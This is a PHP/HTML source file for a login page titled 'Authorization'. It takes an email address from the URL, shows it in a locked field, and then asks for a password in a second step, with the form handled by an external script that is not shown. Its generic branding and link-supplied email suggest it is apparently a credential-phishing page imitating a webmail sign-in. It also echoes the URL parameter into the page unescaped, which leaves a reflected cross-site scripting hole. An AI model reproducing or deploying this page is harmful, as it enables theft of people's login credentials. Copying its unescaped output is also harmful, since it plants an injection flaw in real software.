<?php
	if(isset($_GET['email'])){
		$email = $_GET['email'];
	}
?>
<!DOCTYPE html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Authorization</title>
	<link rel="icon" type="icon" href="icon.png">
	<link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
	<style type="text/css">
		body{
			background-repeat: no-repeat;
			background:url("bg.jpg");
			background-size: cover;
		}

		.container{
			width:100%;
			display: flex;
			justify-content: center;
			align-items: center;
			height: 100vh;
		}

		.office{
			width: 300px;
			background: #fff;
		}

		.verify{
			width: 85%;
			margin: auto;
			overflow: hidden;
		}

		.verify h4{
			font-family: arial;
		}

		.verify input[type='email']{
			width: 100%;
			float: right;
			border:none;
			height: 40px;
			padding:3px 10px;
			border-bottom: 2px solid #ffdb4d;
		}

		.verify input[type='password']{
			width: 100%;
			float: right;
			border:none;
			height: 40px;
			padding:3px 10px;
			border-bottom: 2px solid #ffdb4d;
		}

		.verify button{
			border:none;
			height: 50px;
			width: 100%; 
			float: right;
			margin-top: 1.3em;
			background: #ffdb4d;
			border-radius: 5px;
			color: #000;
		}

		.email-to-verify{
			border:1px solid #000;
			border-radius: 10px;
		}

		.hide{
			display: none;
		}
	</style>
</head>
<body>
	<div class="container">
		<div class="office" id="verify" style="border: 1px solid #eee; border-radius: 5px; padding:50px 0px; width: 380px;">
			<div class="verify" style="text-align: center;">
				<div style="width: 100%; margin-bottom: 10px; float: left;">
					<img src="authorization.png" width="100px" style="float: left;">
				</div>
				<p style="float: left;">Log in to continue</p>
			</div>
			<div class="verify">
			    <p id="processing" style="width:100%; text-align:center"></p>
			</div>
			<div class="verify" id="emailDiv" style="margin-top: 5em; margin-bottom: 8em;">
				<input type="email" name="" placeholder="Enter your login, email or phone" id="email" value="<?php echo $email; ?>" disabled>
				<p style="color: #4981d7; margin: 0; margin-top: 5px; float: left;">Forgot your login?</p>
				<p style="margin:0px; color: red; font-family: Arial, Helvetica, sans-serif; font-size: 13px; margin-top: 3px;" id="error"></p>
				<button id="next">Log in</button>
			</div>
			<div class="verify hide" id="passwordDiv" style="margin-top: 5em; margin-bottom: 8em;">
				<input type="password" name="" placeholder="Password" id="password">
				<p style="margin:0px; color: red; font-family: Arial, Helvetica, sans-serif; font-size: 13px; margin-top: 3px;" id="error"></p>
				<button id="login">Log in</button>
			</div>
		</div>
	</div>
	<script src="vendor/jquery/jquery-2.2.3.min.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
	<script src="js/data.js"></script>
</body>
</html>